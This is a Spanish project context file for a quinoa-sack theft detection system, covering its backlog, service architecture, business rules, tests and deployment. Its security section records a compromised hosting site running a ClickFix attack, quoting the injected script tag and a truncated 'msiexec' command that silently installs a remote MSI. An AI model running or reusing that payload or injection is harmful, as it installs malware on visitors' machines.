# QUINOR S.A.C. - Sistema de deteccion de sustraccion de quinua

> **Este archivo es lo primero que hay que leer al abrir una sesion nueva.**
> Contiene el estado real del desarrollo, las decisiones que ya se tomaron y por
> que, y lo que falta. Esta escrito para que una sesion que empieza de cero
> pueda continuar sin repetir trabajo ni contradecir lo ya construido.
>
> Ultima actualizacion: **18/10/2026**, al cerrar HU-13. **El MVP de 14
> historias esta completo.**

---

## 1. Para que existe el sistema

QUINOR S.A.C. exporta quinua en sacos de 50 kg dentro de contenedores. Sufre
hurtos y sustitucion de producto durante el despacho, y el problema se detecta
solo cuando el cliente final reclama, semanas despues. No hay trazabilidad en
tiempo real y existen puntos ciegos en toda la cadena.

La Alternativa 1 ataca el eslabon donde el producto todavia esta bajo control de
la empresa: **la rampa de carga**. La idea en una linea: cuando el peso real no
cuadra con el esperado, el sistema recorta el video de esa carga, cuenta los
sacos que cruzaron la linea, mira quien estuvo en la zona, pide a un modelo que
describa lo que paso, y avisa al supervisor antes de que el contenedor salga de
planta.

Dos casos que el sistema distingue a proposito, porque significan cosas
distintas:

- **Faltan sacos.** Bultos que no subieron al camion, o que salieron de la zona.
- **Los sacos cuadran y falta peso.** Sustitucion del contenido, que es el
  problema que mas duele y el mas dificil de ver a ojo.

### Documentos de referencia

| Archivo | Que contiene |
|---|---|
| `Documento_Funcional_Tecnico_Alternativa1_QUINOR.docx` | Especificacion funcional y tecnica, v1.2. Es la fuente de verdad de requisitos |
| `Backlog_Seguimiento_Alternativa1_QUINOR.xlsx` | Hoja `Historias`: las 14 del MVP. Hoja `Backlog`: las 6 postergadas. Estado, puntos y dependencias |
| `despacho/api/db/01_esquema.sql` | Fuente de verdad del modelo de datos |
| `despliegue/LEEME.md` | Como desplegar la base en el hosting |

Los apartados del documento se citan a lo largo del codigo (apartado 5.3 los
estados, 6.4 los componentes, 8 la seguridad, 9.2 la calidad del analisis). Esas
referencias son deliberadas: permiten volver del codigo al requisito.

---

## 2. Estado del backlog y alcance del MVP

**MVP de 14 historias, 51 pts. 14 DONE (51 pts). El MVP esta completo.**
El nucleo de captura, deteccion y analisis esta construido y probado; la pantalla
por la que entra el supervisor (HU-11), el detalle donde verifica el clip (HU-12)
y el veredicto con el que cierra el caso (HU-13) tambien. Con HU-13 cerrada, el
piloto ya puede medir lo que le exige la salida del apartado 10.1 (menos de 20 %
de falsos positivos) y la concordancia de severidad del apartado 2.4 (85 %):
ambas cifras se calculan comparando lo que dijo el sistema con lo que decidio el
supervisor, y esa decision ahora queda escrita.

### Renumeracion del 03/10/2026

Para que la hoja `Historias` no tenga huecos se intercambiaron dos IDs. **El
codigo, los README, las pruebas y el esquema SQL aun usan la numeracion
antigua**: donde el codigo diga HU-15 se refiere a usuarios y tokens.

| Antes | Ahora | Historia | Hoja |
|---|---|---|---|
| HU-15 | **HU-14** | Usuarios, roles y tokens | Historias (MVP) |
| HU-14 | **HU-15** | Reportes PDF y Excel | Backlog |

Otros cambios del mismo dia en el Excel: HU-12 y HU-13 pasaron del Sprint 3 al
Sprint 4 (HU-12 depende de HU-09, que es del Sprint 4), y se corrigio la columna
"Dependencia cruzada" de HU-03 y HU-16. La copia previa quedo en
`Backlog_Seguimiento_Alternativa1_QUINOR_pre_reaplicar_20261003.xlsx`.

### Hoja Historias: el MVP

| HU | Sprint | Categoria | Pts | Estado | Donde vive |
|---|---|---|---|---|---|
| HU-01 Lectura de bascula (Modbus) | 1 | Captura | 3 | **DONE** | `despacho/api` |
| HU-02 Orden de despacho del ERP | 1 | Captura | 3 | **DONE** | `despacho/api` |
| HU-03 Evento de discrepancia | 2 | Deteccion | 3 | **DONE** | `despacho/api` |
| HU-04 Tolerancias por producto | 1 | Configuracion | 2 | **DONE** | `despacho/api` |
| HU-05 Grabacion continua 72 h | 2 | Video | 5 | **DONE** | `despacho/grabador` |
| HU-06 Recorte del clip del evento | 2 | Video | 3 | **DONE** | api + grabador |
| HU-07 Conteo de sacos con YOLO | 3 | IA | 8 | **DONE** | `despacho/yolo` + grabador |
| HU-08 Personas en zona de carga | 4 | IA | 5 | **DONE** | `despacho/yolo` + grabador |
| HU-09 Descripcion y severidad (VLM) | 4 | IA | 5 | **DONE** | `despacho/vlm` + grabador |
| HU-10 Alerta por correo | 4 | Alertas | 3 | **DONE** | `despacho/notificaciones` |
| HU-11 Bandeja de eventos con filtros | 2 | Dashboard | 3 | **DONE** | `despacho/api` |
| HU-12 Detalle del evento | 4 | Dashboard | 3 | **DONE** | `despacho/api` + dashboard |
| HU-13 Clasificar evento | 4 | Dashboard | 2 | **DONE** | `despacho/api` + dashboard |
| HU-14 Usuarios, roles y tokens (antes HU-15) | 1 | Seguridad | 3 | **DONE** | `despacho/api` |

### Hoja Backlog: postergadas fuera del MVP

| HU | Sprint | Categoria | Pts | Motivo |
|---|---|---|---|---|
| HU-15 Reportes PDF y Excel (antes HU-14) | 5 | Reportes | 3 | Mide tendencias de semanas, no valida el MVP |
| HU-16 Auditoria consultable | 4 | Seguridad | 2 | Criterios 1 y 3 ya los cumple el motor; falta solo mostrarla |
| HU-17 Cola de tareas (Celery) | 1 | Plataforma | 3 | El bucle del grabador hace de worker; su criterio 2 depende de HU-18 |
| HU-18 Panel de salud | 5 | Plataforma | 3 | Depende de HU-17; `GET /salud` ya registra los fallos |
| HU-19 Reentrenamiento YOLO | 5 | IA | 5 | Espera el dataset real de QUINOR |
| HU-20 Exportar listado | 5 | Reportes | 1 | Could, la menor prioridad |

**El MVP esta cerrado.** Las 14 historias estan DONE. Lo que queda en el
repositorio son las historias de la hoja Backlog, todas fuera del MVP, y el
despliegue en el hosting, que sigue bloqueado por el apartado 11.

HU-13 se entrego el 18/10/2026: `POST /eventos/{id}/veredicto` con rol Supervisor
o Administrador, el veredicto y su historial dentro del detalle de HU-12, el
comentario obligatorio de 10 caracteres (RN-05) contado sobre el texto recortado,
y el usuario sacado del token y no del cuerpo de la peticion, que es lo que
impide firmar una decision en nombre de otro.

**HU-17 sigue PENDING a peticion del usuario (hoja Backlog, fuera del MVP).**
Sustituiria el sondeo por una cola Celery. Mientras no llegue, el bucle del
grabador hace de worker. El codigo esta preparado: cuando HU-17 entre, lo unico
que cambia es **quien llama** a `clips.procesar_evento`, `conteo.contar`,
`interpretacion.interpretar` y `aviso.avisar`, no lo que hacen.

---

## 3. Arquitectura

Cinco servicios, cada uno en su contenedor, hablando por HTTP y compartiendo una
sola base de datos.

```
   Bascula Modbus          ERP/WMS              Camaras IP (RTSP)
        |                     |                        |
        v                     v                        v
   +--------------------------------------+   +--------------------------+
   |         ORQUESTADOR (api)            |   |       GRABADOR           |
   |  FastAPI, puerto 8000                |   |  proceso, sin HTTP       |
   |  HU-01 pesadas    HU-02 ordenes      |   |  HU-05 buffer 72 h       |
   |  HU-03 eventos    HU-04 tolerancias  |   |  HU-06 recorte del clip  |
   |  HU-14 usuarios   HU-11 bandeja      |   |  Orquesta 07, 08, 09, 10 |
   |  HU-12 detalle    HU-13 veredicto    |   |                          |
   +--------------------------------------+   +--------------------------+
                    |                              |        |         |
                    |                              v        v         v
                    |                         +-------+ +------+ +--------------+
                    |                         | YOLO  | | VLM  | |NOTIFICACIONES|
                    |                         | :8002 | |:8003 | |    :8004     |
                    |                         |HU-07  | |HU-09 | |    HU-10     |
                    |                         |HU-08  | |      | |              |
                    |                         +-------+ +------+ +--------------+
                    |                              |        |         |
                    v                              v        v         v
             +---------------------------------------------------------+
             |   MariaDB (13 tablas, 2 vistas, 3 triggers)             |
             |   MinIO (clips y fotogramas, 12 meses)                  |
             +---------------------------------------------------------+
                    |
                    v
             Dashboard Streamlit :8501
```

### Por que esta partido asi

No es microservicios por moda. Cada corte responde a un motivo concreto:

**El grabador va aparte** porque grabar sin parar y atender peticiones HTTP son
dos trabajos distintos. Un fallo del grabador no puede llevarse por delante el
registro de pesadas de HU-01.

**YOLO va aparte** por tamano y por hardware: son gigas de PyTorch y en planta
necesita la GPU del RNF-06. El clip viaja por ruta de disco compartida, no por
HTTP, porque son cientos de megas por evento.

**VLM va aparte** por lo contrario: es el unico servicio del sistema que sale a
internet. Tenerlo solo deja esa salida en un sitio que se puede cortar, vigilar
y ponerle cuota.

**Notificaciones va aparte** por lo mismo que VLM: es el otro servicio que habla
con un servidor de fuera.

### Quien llama a quien

```
pesada (HU-01) -> evento si supera tolerancia (HU-03)
                     |
                     v
   grabador, en su bucle de sondeo:
     recorta el clip (HU-06)  --->  POST /analisis/yolo  (HU-07 + HU-08)
                                          |
                                          v
                              POST /analisis/vlm  (HU-09, solo si RN-03)
                                          |
                                          v
                              POST /notificaciones (HU-10, criterio 3)
```

La cadena entera corre en **una sola pasada** por evento, mientras el clip
todavia esta en disco local y los fotogramas en memoria. Bajarlos luego de MinIO
para lo mismo seria pagar dos veces el viaje. Ademas, cada paso tiene su pasada
de reintento en el bucle, para lo que fallo.

---

## 4. Tecnologias

| Capa | Tecnologia | Donde y por que |
|---|---|---|
| API | FastAPI 0.115 + uvicorn | Los cinco servicios HTTP |
| Validacion | Pydantic 2.10 | Contratos de entrada y salida |
| ORM | SQLAlchemy 2.0 | ORM en el orquestador; Core en los demas |
| Driver | PyMySQL 1.1 + cryptography | MariaDB y MySQL |
| Base de datos | MariaDB 11.4 (prod), MySQL 8 (verificado) | 13 tablas, 2 vistas, 3 triggers |
| Bascula | pymodbus 3.x | HU-01, Modbus TCP |
| ERP | httpx | HU-02, cliente REST con cache local |
| Video | ffmpeg (muxer segment y concat) | HU-05 y HU-06, con `-c copy`, sin reencodificar |
| RTSP | mediamtx | Servidor de camaras simuladas |
| Vision | ultralytics YOLO11n + ByteTrack | HU-07 conteo, HU-08 seguimiento |
| Imagen | OpenCV | Fotogramas clave (HU-09) |
| Modelo VLM | httpx contra Anthropic u OpenAI | HU-09, adaptador por proveedor |
| Correo | aiosmtplib | HU-10, apartado 6.4 |
| Almacen | MinIO (S3) | Clips y fotogramas, 12 meses. El grabador sube, la API **solo firma** enlaces (HU-12) |
| Dashboard | Streamlit + pandas | HU-04, HU-14, bandeja (HU-11), detalle con video (HU-12) y clasificacion (HU-13) |
| Seguridad | passlib[bcrypt], tokens opacos | HU-14 |
| Observabilidad | structlog (JSON) | Los cinco servicios |
| Pruebas | pytest, pytest-cov, aiosmtpd, moto | Umbral 90 %, real 100 % |
| Contenedores | Docker Compose, 16 servicios | `despacho/api/docker-compose.yml` |

### Lo que se decidio NO usar

- **SDK de ningun proveedor de IA.** El cliente habla HTTP con un adaptador por
  proveedor. Los SDK cambian mas rapido que las APIs, y atarse a uno convertiria
  el cambio de proveedor en una reescritura en lugar de una variable de entorno.
- **OpenCV para grabar.** Reencodifica y consume CPU sin necesidad. ffmpeg con
  `-c copy` copia el flujo tal cual.
- **Slack, Teams y SMS.** Salieron del alcance de HU-10 el 18/09/2026.

---

## 5. Mapa del repositorio

```
quinor/
  CONTEXTO_DEL_PROYECTO.md          <- este archivo
  Documento_Funcional_Tecnico_Alternativa1_QUINOR.docx
  Backlog_Seguimiento_Alternativa1_QUINOR.xlsx
  despliegue/                       paquete para el hosting (ver seccion 9)
  despacho/
    api/                  orquestador: HU-01, 02, 03, 04, 06(marca), 11, 12, 13, 15
      app/                main.py y un modulo por caso de uso
      app/bandeja.py      listado con filtros, dos consultas (HU-11)
      app/detalle.py      detalle del evento, cuatro consultas (HU-12 y HU-13)
      app/almacen.py      enlaces firmados a MinIO, solo firma (HU-12)
      app/veredictos.py   clasificacion del evento y transiciones (HU-13)
      db/01_esquema.sql   FUENTE DE VERDAD del modelo de datos
      dashboard/app.py    interfaz Streamlit, con el reproductor de HU-12
      sim/                simuladores de bascula (Modbus) y ERP
      tests/              una suite por modulo
      docker-compose.yml  los 16 servicios del entorno
    grabador/             HU-05, 06, y orquesta 07, 08, 09, 10
      app/grabador.py     bucle principal y supervisor de ffmpeg
      app/clips.py        caso de uso del clip
      app/conteo.py       llama a YOLO y escribe el conteo
      app/interpretacion.py  llama al VLM y escribe severidad
      app/aviso.py        llama a notificaciones (HU-10)
      sim/camara_sim.py   camara simulada sobre RTSP
    yolo/                 HU-07 conteo, HU-08 personas, fotogramas de HU-09
      modelos/sacos.pt    modelo entrenado (mAP50 0.994)
      sim/rampa_sim.py    generador de video sintetico
      sim/entrenar.py     entrenamiento
      sim/validar.py      mide el criterio 2 de HU-07
    vlm/                  HU-09
      app/severidad.py    RN-04, la regla que manda
      app/invocacion.py   RN-03, la puerta que controla el costo
      sim/vlm_stub.py     proveedor de mentira, por HTTP de verdad
    notificaciones/       HU-10
      app/destinatarios.py  criterio 1: quien recibe cada nivel
      app/plantilla.py      criterio 2: que dice el correo
      app/correo.py         envio con reintentos
```

Los cinco servicios comparten la misma disposicion, copiada del ejemplo
`quinor/blockchain/api`: fabrica de aplicacion (`create_app` o `crear_grabador`),
configuracion inyectada por parametro, `app/` con el codigo, `tests/` con una
suite por modulo, `sim/` con los simuladores, y `pytest.ini` con el umbral.

---

## 6. Convenciones que hay que respetar

Si una sesion nueva no lee nada mas de este archivo, que lea esto.

1. **El esquema es la fuente de verdad.** `despacho/api/db/01_esquema.sql`. Solo
   el orquestador define tablas. Los demas servicios son invitados: declaran las
   columnas que usan con SQLAlchemy Core, no con modelos ORM, justamente para
   que se note quien manda.

2. **La configuracion se inyecta, no se lee al importar.** Cada servicio tiene
   un `Ajustes` inmutable que la fabrica construye una vez. Ningun modulo llama a
   `os.environ` por su cuenta. Esto es lo que permite probar sin un entorno.

3. **Ninguna clave en el codigo** (apartado 8). Variables de entorno o secretos
   de Docker. La contrasena SMTP ni siquiera aparece al imprimir los ajustes.

4. **Las pruebas corren contra cosas reales.** MySQL y MariaDB reales, ffmpeg
   real, servidor RTSP real, S3 real (moto), SMTP real (aiosmtpd), servicios de
   mentira pero por HTTP de verdad. Un mock demuestra que se llamo a una
   funcion, que es lo que no falla nunca.

5. **Cobertura minima 90 %.** Hoy los cinco servicios estan en 100 %.

6. **RN-08 no se negocia.** Ni identificacion facial, ni datos biometricos. De
   cada persona se guardan un numero temporal valido solo dentro de ese clip,
   dos fotogramas y unos segundos. Hay pruebas que vigilan la **forma** de los
   datos, de modo que anadir un recorte de imagen rompa la suite antes de que
   eso salga de la red interna.

7. **NULL no es cero.** Se repite en todo el codigo: `sacos_contados` en NULL
   significa que el clip no se analizo, no que el camion iba vacio.
   `personal_anomalo` en NULL significa que no se miro, no que estaba bien.
   `segundos_desde_analisis` en NULL significa que no se pudo medir, y fingir un
   cero daria por cumplido el criterio 3 sin haberlo comprobado.

8. **Un fallo se registra, no se esconde.** Todo lo que sale mal deja fila en
   `auditoria` o en la tabla que corresponda, y se ve en el dashboard.

9. **Una lista no lee por fila.** Salido de HU-11: si una pantalla devuelve N
   filas, tiene que costar un numero fijo de consultas, no N. El detalle de un
   elemento se pide aparte y se paga una vez. Hay una prueba que lo vigila
   contando sentencias, y conviene copiarla en cualquier listado nuevo.

10. **Lo accesorio no tumba lo principal.** Salido de HU-12: el detalle de un
    evento no lanza una excepcion porque el video no se pueda enlazar. Devuelve
    el hueco con un `motivo` estable y una frase que lo explica, y la pantalla
    la escribe. El supervisor tiene delante una discrepancia de peso que existe
    de verdad; perderla por el reproductor seria el peor resultado posible.

11. **Los comentarios explican el porque, no el que.** El codigo ya dice lo que
   hace. Los comentarios dicen por que se eligio eso y que pasaria con la
   alternativa. Mantener ese estilo.

12. **Ante una ambiguedad, preguntar.** Instruccion explicita del proyecto: si
    falta informacion, detenerse y preguntar antes de seguir.

---

## 7. Reglas de negocio vigentes

| Regla | Que dice | Donde vive |
|---|---|---|
| RN-01 | Tolerancia por producto en kg y en %, manda la mas restrictiva | `api/app/configuracion.py` |
| RN-02 | Sin orden valida no hay evento, hay incidencia de integracion | `api/app/eventos.py` |
| RN-03 | El VLM se invoca solo si YOLO confirma diferencia o personal anomalo | `vlm/app/invocacion.py` |
| RN-04 | Alta: 2+ sacos o sacos saliendo. Media: 1 saco o personal anomalo. Baja: el resto | `vlm/app/severidad.py` |
| RN-05 | Cambiar el estado de un evento exige comentario | `api/app/veredictos.py` y el CHECK `ck_veredicto_comentario` |
| RN-06 | Un Confirmado no vuelve a Pendiente | trigger `trg_evento_no_reabrir` |
| RN-07 | Video 72 h en buffer, clips 12 meses | `grabador/app/retencion.py` |
| RN-08 | Sin identificacion facial ni biometria | `yolo/app/personas.py` y el esquema |

**La severidad sale de la RN-04, no del modelo.** Es la decision de diseno mas
importante de HU-09. Una alerta de madrugada y el orden de la cola de revision no
pueden depender de la temperatura de un modelo. "Alta porque la diferencia fue de
3 sacos" se puede comprobar; "Alta porque el modelo lo dijo" no. La del modelo se
guarda aparte como `severidad_ia`, y de comparar las dos sale la concordancia
semanal del apartado 9.2.

---

## 8. Estados y flujo del evento

Estados del apartado 5.3:

```
   pesada fuera de tolerancia
            |
            v
      [pendiente] ------- sin video en el buffer -----> [sin_clip]
            |
            | el VLM agoto sus 3 reintentos
            v
   [pendiente_analisis] --- reintento con exito ---> [pendiente]
            |
            | el supervisor clasifica (HU-13). El paso por
            | [en_revision] es opcional: desde cualquier estado
            | abierto, incluido [sin_clip], se puede cerrar ya
            v
      [en_revision]
         /        \
        v          v
  [confirmado] <--> [falso_positivo]     correccion, con comentario
        |                 |              y fila nueva en el historial
        +--------+--------+
                 |
                 +--- RN-06: de aqui no se vuelve a un estado abierto.
                      Lo impiden la tabla de transiciones de
                      `api/app/veredictos.py`, el contrato de la API
                      y el trigger `trg_evento_no_reabrir` del motor
```

Un caso que un supervisor ya abrio o cerro **no lo toca ningun proceso
automatico**. Un analisis que falla tarde no puede devolver a la cola un caso en
revision.

---

## 9. Base de datos y despliegue

**13 tablas:** `usuario`, `api_token`, `orden_despacho`, `pesada`, `carga`,
`configuracion`, `auditoria`, `salud_componente`, `evento`, `persona_en_evento`,
`notificacion`, `veredicto`, `modelo_version`.

**2 vistas:** `v_salud_actual` (ultimo estado por componente),
`v_evento_dashboard` (de HU-03; la bandeja de HU-11 acabo consultando las tablas
 directamente, para poder combinar filtros sin reescribir la vista).

**3 triggers:** `trg_evento_no_reabrir` (RN-06), `trg_auditoria_no_update` y
`trg_auditoria_no_delete` (HU-16). Las reglas viven en el motor y no solo en la
aplicacion, de modo que ni un script suelto pueda saltarselas.

### Servidor de produccion

| Dato | Valor |
|---|---|
| Host | `vallesol.pe` |
| Base | `vallesol_yolo` |
| Usuario | `vallesol_user_yolo` |
| Motor | MariaDB 11.4.13 |

```
DATABASE_URL=mysql+pymysql://vallesol_user_yolo:CLAVE@vallesol.pe:3306/vallesol_yolo?charset=utf8mb4
```

Si la clave lleva `[` o `]`, hay que codificarlos como `%5B` y `%5D`.

### Como desplegar

La carpeta `despliegue/` tiene el paquete listo y su `LEEME.md`. Orden:
diagnostico, esquema, triggers, datos demo (opcional), verificacion. Desde
PowerShell:

```powershell
cd C:\proyectos\PI1\quinor\despliegue
powershell -ExecutionPolicy Bypass -File .\desplegar.ps1 -SoloDiagnostico
```

**El despliegue en el servidor esta PENDIENTE**, por el asunto de seguridad de
la seccion 11.

### Trampa de compatibilidad, ya resuelta

El esquema fijaba `utf8mb4_0900_ai_ci`, que **solo existe en MySQL 8**. En
MariaDB moria en la linea 60 con `ERROR 1273: Unknown collation`, antes de crear
la primera tabla. Ahora no se fija ninguna colacion y se hereda la del servidor.
Ademas, desde MariaDB 11.4.2 la colacion por defecto es `utf8mb4_uca1400_ai_ci`,
otra mas. Los scripts de verificacion avisan si quedan varias mezcladas, porque
eso rompe el primer JOIN que compare textos.

**Regla para el futuro: no fijar colaciones.** Y si hace falta un upsert, usar
`VALUES()` dentro de `ON DUPLICATE KEY UPDATE`, que es lo unico que aceptan los
dos motores.

---

## 10. Pruebas: 1350 en total, 100 % de cobertura

| Servicio | Pruebas | Cobertura | Contra que corre |
|---|---|---|---|
| `api` | 520 | 100 % | MySQL y MariaDB reales, Modbus en proceso, ERP con respx, firma de MinIO sin red |
| `grabador` | 279 | 100 % | MySQL, ffmpeg, RTSP mediamtx, S3, tres servicios HTTP falsos |
| `yolo` | 222 | 100 % | Modelo entrenado real, video real generado |
| `vlm` | 185 | 100 % | Stub que habla el dialecto del proveedor por HTTP |
| `notificaciones` | 144 | 100 % | MySQL y un servidor SMTP real (aiosmtpd) |

Las tres suites que usan base de datos corren verdes en **MySQL 8.0.46 y en
MariaDB 10.11.14**.

```bash
# En cada servicio
TEST_DATABASE_URL=mysql+pymysql://usuario:clave@127.0.0.1:3306/quinor_test pytest
# El grabador necesita ademas:
MEDIAMTX_BIN=/ruta/a/mediamtx
```

**Las suites NO deben apuntar al servidor real.** Su `conftest.py` hace
`DROP DATABASE` y `TRUNCATE` en cada prueba, por diseno.

### Lo que las pruebas encontraron, y que conviene no repetir

- **HU-07, el bug mas caro.** El conteo daba cero en las ocho cargas de
  validacion. El detector veia los sacos perfectamente (mAP50 0.994); era
  ByteTrack, que asocia por solapamiento: con `YOLO_FRAME_STRIDE=2` un saco
  avanzaba mas que su propio ancho entre fotogramas mirados y nunca recibia
  identificador. El valor por defecto paso a 1, y ademas el fallo dejo de ser
  silencioso: si el detector ve objetos y el rastreador no sigue ninguno, la
  respuesta trae un aviso. Sin eso, un stride mal puesto devuelve cero y parece
  un camion sin cargar, que es justo la conclusion que mandaria a alguien a la
  rampa por nada.
- **Dos pruebas fragiles por fecha**, que pasaban hoy y fallarian en una semana.
  Ahora generan sus marcas de tiempo relativas al momento de correr.
- **La colacion de MySQL 8** en el esquema y en tres `conftest.py`.
- **HU-11, el N+1 del listado.** `GET /eventos` armaba cada fila con cuatro
  consultas: la pesada, la orden y dos lecturas de auditoria. Con 200 filas eran
  mas de 800 consultas, 0,55 s medidos contra 800 eventos. La bandeja nueva usa
  dos consultas y tarda 0,02 s. Cumplia el criterio igual, pero crecia con las
  filas, y la pantalla que mas se usa es la que peor envejece. Ahora hay una
  prueba que **cuenta las sentencias** que llegan al motor y falla si alguien
  vuelve a leer algo por fila.
- **HU-12, firmar un enlace de MinIO sale a la red si no le dices la region.**
  Antes de firmar, el cliente pregunta al servidor donde vive el bucket con un
  `GET ?location=`. Con MinIO caido, el detalle del evento se quedaba esperando,
  y lo que subia no era un error de S3 sino un `MaxRetryError` de urllib3, que
  el `except` no atrapaba: un 500 en la pantalla del supervisor por culpa de un
  video. Se arregla pasando `region` al construir el cliente (`MINIO_REGION`,
  'us-east-1' por defecto en MinIO), y la prueba lo vigila apuntando a un host
  que no resuelve: si alguien quita la region, la suite se cae.
- **HU-12, el clip es Matroska y no todos los navegadores lo abren.** El
  grabador escribe `.mkv` a proposito, porque un corte de luz no se lleva el
  fichero entero. Chrome y Edge lo reproducen; Firefox y Safari no. Comprobado
  en Chromium: el contenedor se reproduce y se puede adelantar dentro de el
  siempre que el servidor atienda `Range`, cosa que MinIO hace. La pantalla lo
  advierte. Si algun dia hace falta Firefox, la salida es remuxar a MP4
  fragmentado al vuelo, sin reencodificar, y eso toca a HU-06.
- **HU-13, Streamlit cierra los desplegables en cada redibujado.** El bloque de
  clasificacion vive dentro del `st.expander` del detalle, y al enviar el
  formulario la pagina se vuelve a pintar entera: el desplegable se cerraba y el
  supervisor no llegaba a ver el resultado de su propia decision. Peor aun, la
  vista por defecto de la bandeja son los Pendientes, asi que el evento recien
  confirmado desaparecia de la tabla y el detalle ya no se dibujaba. Se arregla
  con tres cosas: el envio es un callback (`on_click`), que corre **antes** de
  que la pasada nueva pida el detalle, asi que lo que se pinta ya es el estado
  nuevo; el callback deja una marca que reabre el desplegable, y se consume al
  leerla para que un redibujado por otra cosa lo cierre como siempre; y el
  evento recien clasificado se queda en el selector y la confirmacion se pinta
  en el panel, fuera del desplegable. Verificado en Chromium con Playwright.

---

## 11. Asunto de seguridad abierto (18/09/2026)

**El sitio `vallesol.pe` esta comprometido.** Sirve una falsa verificacion de
Cloudflare que pide al visitante pulsar Win+R, Ctrl+V y Enter. Eso ejecuta lo
que el atacante puso en el portapapeles. Es el ataque ClickFix.

- Inyeccion: `<script src="https://trackerredirect.online/embed.js?v=19">` en el
  `<head>` del WordPress, con dominios de respaldo `campaigntracker.icu`, `.run`
  y `.top`.
- Payload observado: `msiexec /package http://murielle22.com/... /Q`, que
  instala un MSI remoto en silencio, ofuscado con Unicode y homoglifos cirilicos.
- En el equipo de desarrollo llego a ejecutarse dos veces el 18/09 a las 21:17 y
  21:18. **Windows Defender lo bloqueo**: no hay eventos de Windows Installer de
  esa hora, ni programas nuevos, ni tareas programadas, ni rastro DNS.

**Antes de desplegar la base conviene:** limpiar la inyeccion en WordPress,
revisar los administradores de WordPress, y rotar credenciales de cPanel, FTP,
WordPress, correo y base de datos. Quien inyecto el script tuvo acceso al mismo
hosting donde vive `vallesol_yolo`, y el `wp-config.php` esta ahi.

---

## 12. Lo que falta, con lo que hay que saber de cada cosa

**HU-17, cola de tareas.** Redis ya esta en el compose. El codigo esta preparado
para que solo cambie quien llama.

**HU-19, reentrenamiento.** `yolo/sim/entrenar.py` y `validar.py` ya existen. La
tabla `modelo_version` tambien. Falta el dataset de planta: lo que hay es
sintetico, y el reporte de validacion lo dice con todas las letras.

### Pendientes que dependen de QUINOR, no del desarrollo

1. **Clave de un proveedor de vision-lenguaje** (Anthropic u OpenAI). Todo esta
   probado contra un stub que habla el mismo dialecto.
2. **Datos del relay SMTP corporativo.** Probado contra mailpit y contra un
   servidor SMTP real de pruebas.
3. **Dataset de sacos reales de yute** para HU-19. El modelo actual se entreno
   con video sintetico.
4. **Acceso a planta** para las camaras y la bascula reales.

---

## 13. Como trabajar en la siguiente sesion

1. Leer este archivo.
2. Leer el `README.md` del servicio que se vaya a tocar. Cada uno explica sus
   decisiones y sus trampas.
3. Mirar el `reporte_coverage.txt` de ese servicio: dice contra que corre la
   suite y que encontro.
4. Confirmar el estado en el Excel, hoja `Historias`. La columna Estado es la
   que manda, y el Resumen se recalcula solo.
5. Al terminar una historia: actualizar el Excel (Estado a DONE, Avance a 1, y
   las observaciones con lo aprendido), el `reporte_coverage.txt`, el README del
   servicio, y **este archivo**.

### Como pedir el trabajo

El proyecto viene funcionando con un patron que conviene mantener: **una
historia por sesion**, con el criterio de aceptacion a la vista y verificacion de
punta a punta antes de darla por cerrada. Las historias se cerraron ejecutando el
sistema de verdad, no solo pasando pruebas unitarias: modelo entrenado sobre
video real, correo llegando a un buzon real, capturas del dashboard.

### El entorno de desarrollo

```bash
cd despacho/api
cp .env.example .env     # y rellenar
docker compose up -d
```

16 servicios, entre ellos los simuladores que sustituyen a la planta: bascula
Modbus, ERP falso, dos camaras publicando por RTSP, MinIO, mailpit en
`localhost:8025` para leer los correos, y el stub del proveedor de IA.

La base del compose es **MariaDB 11.4**, el mismo motor del hosting. Se cambio
desde MySQL 8.4 el 19/09/2026, despues de que la diferencia de colaciones
demostrara que desarrollar contra un motor y desplegar en otro esconde problemas
hasta el peor momento.

---

## 14. Glosario rapido

| Termino | Que es |
|---|---|
| Evento | Discrepancia entre peso real y esperado que supero la tolerancia |
| Clip | Recorte de video de la ventana de esa carga, en MinIO |
| Buffer | Video continuo de las ultimas 72 h, en disco local |
| Fotograma clave | Imagen elegida por lo que ocurre en ella (saco saliente, pico de personas) |
| Severidad | Alta, Media o Baja segun RN-04. La calcula una regla, no el modelo |
| `severidad_ia` | La que propuso el modelo. Se guarda para medir concordancia |
| Id temporal | Numero que el rastreador da a una persona **dentro de un clip**. No identifica a nadie |
| Sacos salientes | Sacos que cruzan la linea hacia fuera del camion. Senal fuerte de hurto |
